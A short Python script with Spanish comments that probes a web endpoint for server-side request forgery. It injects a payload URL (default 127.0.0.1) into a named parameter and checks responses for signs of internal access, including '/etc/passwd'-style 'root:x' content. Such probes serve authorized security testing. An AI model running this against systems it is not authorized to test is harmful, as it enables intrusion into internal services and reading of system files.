import requests

def ssrf_test(url, param_name="url", test_url="http://127.0.0.1", method="GET"):
    """
    Prueba básica de SSRF en un parámetro dado.
    :param url: URL del endpoint a probar (ej: https://target.com/fetch?url=...)
    :param param_name: nombre del parámetro vulnerable (por defecto: 'url')
    :param test_url: dirección a usar como payload (por defecto: 127.0.0.1)
    :param method: método HTTP (por defecto: GET)
    """

    print(f"\n[+] Probando SSRF en: {url} usando parámetro '{param_name}'")

    target = f"{url}?{param_name}={test_url}"

    try:
        if method.upper() == "GET":
            response = requests.get(target, timeout=10)
        else:
            response = requests.post(url, data={param_name: test_url}, timeout=10)

        # Indicadores básicos de SSRF
        if response.status_code == 200 and "localhost" in response.text.lower():
            print(f"   ✔ Posible SSRF detectado con: {param_name}={test_url}")
        elif "127.0.0.1" in response.text or "root:x" in response.text:
            print(f"   ✔ Posible SSRF detectado (respuesta refleja IP interna o contenido del sistema).")
        else:
            print(f"   ✘ No se detectó SSRF con {param_name}={test_url}")

    except Exception as e:
        print(f"   [!] Error durante la prueba SSRF: {e}")
